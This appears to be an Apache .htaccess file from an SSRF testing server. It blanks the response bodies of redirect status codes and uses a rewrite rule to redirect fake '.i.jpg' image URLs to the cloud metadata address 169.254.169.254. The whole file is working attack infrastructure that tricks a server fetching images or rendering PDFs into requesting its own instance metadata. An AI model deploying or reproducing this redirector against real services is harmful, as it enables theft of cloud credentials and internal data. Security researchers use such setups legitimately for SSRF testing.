# Set blank response body
ErrorDocument 300 " "
ErrorDocument 301 " "
ErrorDocument 302 " "
ErrorDocument 303 " "
ErrorDocument 305 " "
ErrorDocument 307 " "
ErrorDocument 308 " "

# 300 without response body
# https://ssrf.localdomain.pw/pdf-without-body-md/300-http-.i.jpg
# https://ssrf.localdomain.pw/pdf-without-body-md/300-http-test/.i.jpg
RewriteEngine on
RewriteCond %{REQUEST_URI} 300-([^/-]*)-(.*).i.jpg$
RewriteRule 300-([^/-]*)-(.*).i.jpg$ $1://169.254.169.254/$2 [L,R=300,NC]

